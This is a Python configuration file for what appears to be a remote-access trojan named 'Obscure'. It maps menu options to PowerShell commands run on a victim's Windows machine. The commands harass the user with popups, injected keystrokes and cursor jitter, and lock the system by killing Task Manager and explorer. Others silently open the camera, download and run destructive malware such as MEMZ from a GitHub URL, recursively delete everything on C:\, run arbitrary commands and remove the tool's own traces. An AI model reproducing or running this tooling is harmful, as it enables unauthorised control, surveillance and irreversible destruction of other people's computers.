import os

LOCAL_PORTS = [1336, 1337]
THIS_DIRECTORY = (os.path.split(os.path.realpath(__file__))[0])
C_MARK = "\u001b[32m\u2713\u001b[90m"
X_MARK = "\u001b[31m\u2717\u001b[90m"
E_MARK = "\u001b[31m\u203c\u001b[90m"

GLOBAL_OPTIONS = { # Create the structure for all user options and commands
    "Create a pop-up": {"TEXT": "Start-Job -ScriptBlock {(New-Object -ComObject Wscript.Shell).Popup('>>TEXT<<',8,'Critical Alert',0x40)}"},
    
    "Type to keyboard": {"TEXT": "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('>>TEXT<<')"},
    
    "Jitter cursor rapidly": "Start-Job -ScriptBlock {Add-Type -AssemblyName System.Windows.Forms; $Cursor = [system.windows.forms.cursor]::Clip; [System.Reflection.Assembly]::LoadWithPartialName('system.windows.forms'); for ($i=1;$i -lt 19999;$i++) { $Position = [system.windows.forms.cursor]::Position; $PositionChange = Get-Random 20; switch (Get-Random 4) { 0 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point($Position.x, ($Position.y + $PositionChange))} 1 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point(($Position.x + $PositionChange),$Position.y)} 2 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point($Position.x, ($Position.y - $PositionChange))} 3 {[system.windows.forms.cursor]::Position = New-Object system.drawing.point(($Position.x - $PositionChange),$Position.y)}} }}",
    
    "Manage files": {
        "Lock file system": "Start-Job -ScriptBlock {Add-Type -AssemblyName System.Windows.Forms; $Cursor = [system.windows.forms.cursor]::Clip; [System.Reflection.Assembly]::LoadWithPartialName('system.windows.forms'); while('$true') {[system.windows.forms.cursor]::Position = New-Object system.drawing.point(9999,9999); Stop-Process -Name 'taskmgr' -Force;}}; Stop-Process -Name 'taskmgr' -Force; Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Stop-Process -Force; Start-Sleep -Milliseconds 100; taskkill /F /IM explorer.exe; Start-Sleep -Milliseconds 10",
        "Unlock file system": "start explorer; Get-Job | Stop-Job; Get-Job | Remove-Job -Force"
    },

    "Capture screenshot": (
        "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Keyboard' -Name 'PrintScreenKeyForSnippingEnabled' -Value 00000000; $proc = Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -Command \"C:\\win64\\init_ds.bat\"' -PassThru; Start-Sleep -Seconds 3; $mpid = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 -ExpandProperty Id",
        "pkill -f feh",
        "Screenshot was saved to out/capture.png."
    ),
    
    "Configure malware": {
        "Salinewin.exe": {
            "Install (non-destructive, purely effects)": "Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\saline.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/salinewin1.5-safety.exe' -OutFile 'C:\\win64\\saline.exe'; Start-Process 'C:\\win64\\saline.exe' -WindowStyle hidden",
            "Stop": "Get-Process 'saline' | Stop-Process -Force"
        },
        "Memz.exe": {
            "Install \u001b[31m(irreversibly destroys system)\u001b[90m": "Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\mz.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/memz.exe' -OutFile 'C:\\win64\\mz.exe'; Start-Process 'C:\\win64\\mz.exe' -WindowStyle hidden",
            "Stop": "Get-Process 'memz' | Stop-Process -Force"
        },
        "ButterflyOnDesktop.exe": {
            "Install (non-destructive, but closed source)": "if(Test-Path 'C:\\win64\\bfly.exe'){for($i=0;$i -lt 5;$i++){Start-Process 'C:\\win64\\bfly.exe'}}else{Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\bfly.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/bod.exe' -OutFile 'C:\\win64\\bfly.exe'; Start-Process 'C:\\win64\\bfly.exe' -WindowStyle hidden}",
            "Stop": "Get-Process 'bfly' | Stop-Process -Force"
        }
    },

    "Open camera": "Start-Process microsoft.windows.camera: -WindowStyle hidden",

    "Wipe machine": {
        "Confirm \u001b[31m(will erase everything)\u001b[90m": (
            "Start-Job -Script-Block {Get-ChildItem -Path C:\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse}",
            "",
            "Connection will remain until target device reboots."
        )
    },

    "Shut down machine": {
        "Confirm \u001b[31m(will break connection, remove Obscure from target files)\u001b[90m": (
            "Get-ChildItem -Path C:\\win64\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; Stop-Computer -Force",
            "",
            "<ENDOF_CONNECTION>"
        )
    },

    "Run custom command": {
        "TEXT": (
            ">>TEXT<<",
            "",
            "?CAPTURED_TMUX"
        )
    },

    "Break connection": {
        "Confirm \u001b[31m(will break connection, remove Obscure from target files)\u001b[90m": (
            "Get-ChildItem -Path C:\\win64\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; Get-Process powershell | Stop-Process -Force",
            "",
            "<ENDOF_CONNECTION>"
        )
    }
}